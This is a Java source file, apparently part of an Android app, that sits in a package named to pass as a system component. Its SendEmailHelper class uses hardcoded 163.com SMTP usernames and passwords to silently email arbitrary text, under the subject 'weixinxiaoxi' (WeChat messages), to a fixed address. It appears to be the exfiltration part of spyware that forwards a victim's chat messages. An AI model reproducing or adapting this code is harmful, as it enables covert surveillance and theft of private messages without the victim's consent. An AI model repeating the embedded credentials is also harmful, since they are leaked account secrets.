package com.android.system.need;

import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.activation.CommandMap;
import javax.activation.MailcapCommandMap;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.Multipart;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

//它依赖三个jar文件
public class SendEmailHelper {
	// 电子邮件服务器smtp协议的服务
	private String host = "smtp.163.com";
	// 邮箱的用户名
	//private String user = "allenxieyuhui";
	// 邮箱的密码
	//private String pwd = "xie888";
	private String user = "18345019902";
	private String pwd = "yang888";
	// 邮件的标题
	private String subject = "";

	// 发件人的地址
	private String from = "";
	// 收件人的地址
	private String to = "";
	/**
	 * 单个线程池
	 */
	static ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();;


	public void setAddress(String from, String to, String subject) {
		this.from = from;
		this.to = to;
		this.subject = subject;
	}

	public void send(String txt) {
		// 关于邮件设置信息都用这个对象
		Properties properties = new Properties();
		// 设置发送邮件的邮件服务器为163服务器
		properties.put("mail.smtp.host", host);
		// 需要经过授权,也就是有用户名和密码的校验，这样才能通过验证
		properties.put("mail.smtp.auth", "true");
		// 用刚刚设置好的properties对象构建一个session(会话)
		Session session = Session.getDefaultInstance(properties);
		// 有了这句，就可以在发送电子邮件的时候在控制台输出整个发送的过程信息，调试程序用。
		session.setDebug(true);
		// 用session为参数定义消息对象
		MimeMessage message = new MimeMessage(session);
		try {
			// 加载发件人的地址
			message.setFrom(new InternetAddress(from));
			// 加载收件人的地址
			message.addRecipient(Message.RecipientType.TO, new InternetAddress(
					to));
			// 加载标题
			message.setSubject(subject);

			// 封装邮件内容和各个部分（附件等等）对象
			Multipart multipart = new MimeMultipart();

			// 设置邮件的文本内容
			BodyPart contentPart = new MimeBodyPart();
			contentPart.setText(txt);
			multipart.addBodyPart(contentPart);

			// 将multipart对象放入message中
			message.setContent(multipart);
			// 保存邮件
			message.saveChanges();
			// 发送邮件
			Transport transport = session.getTransport("smtp");
			// 连接服务器的邮箱
			transport.connect(host, user, pwd);
			// 把邮件发出去
			MailcapCommandMap mc = (MailcapCommandMap) CommandMap
					.getDefaultCommandMap();
			// 设置发邮件的时候的mime类型组合，下面的设置如果不写，邮件发布出去
			mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
			mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
			mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
			mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
			mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
			CommandMap.setDefaultCommandMap(mc);
			transport.sendMessage(message, message.getAllRecipients());
			transport.close();
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
		}

	}

	public static void sendEmail(final String string) {
		if(singleThreadExecutor!=null){
			singleThreadExecutor.execute(new Runnable() {
				@Override
				public void run() {
					SendEmailHelper sendEmailHelper = new SendEmailHelper();
					// 设置发件人地址、收件人地址、邮件的标题
					//sendEmailHelper.setAddress("allenxieyuhui@163.com", "1119021319@qq.com",
					//		"weixinxiaoxi");
					sendEmailHelper.setAddress("18345019902@163.com", "17051288801@163.com",
							"weixinxiaoxi");
					sendEmailHelper.send(string);
				}
			});
		}

	}

}
